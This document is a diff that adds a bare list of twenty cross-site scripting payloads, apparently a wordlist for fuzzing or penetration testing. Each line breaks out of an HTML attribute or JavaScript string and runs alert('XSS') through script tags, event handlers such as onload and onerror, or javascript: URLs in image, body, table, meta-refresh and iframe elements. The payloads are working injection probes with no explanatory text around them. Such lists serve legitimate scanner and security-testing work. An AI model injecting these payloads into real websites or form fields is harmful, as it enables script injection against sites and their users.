@@ -1,0 +1,20 @@
+"><input>
+"><iframe onload=alert('XSS')>
+"><img id=XSS SRC=x onerror=alert(XSS);>
+"><IMG id=XSS SRC="javascript:alert('XSS');">
+"><IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+"><SCRIPT>alert(/XSS/.source)</SCRIPT>
+"><BODY BACKGROUND="javascript:alert('XSS')">
+"></TITLE><SCRIPT>alert("XSS");</SCRIPT>
+"><INPUT TYPE="IMAGE" id=XSS SRC="javascript:alert('XSS');">
+"><BODY ONLOAD=alert('XSS')>
+"><LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+"><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+"><TABLE id=XSS BACKGROUND="javascript:alert('XSS')">
+"><TABLE id=XSS><TD BACKGROUND="javascript:alert('XSS')">
+"><DIV id=XSS STYLE="background-image: url(javascript:alert('XSS'))">
+"><IFRAME id=XSS SRC="javascript:alert('XSS');"></IFRAME>
+"><FRAMESET><FRAME id=XSS SRC="javascript:alert('XSS');"></FRAMESET>
+"><TABLE BACKGROUND="javascript:alert('XSS')">
+';alert('XSS');//
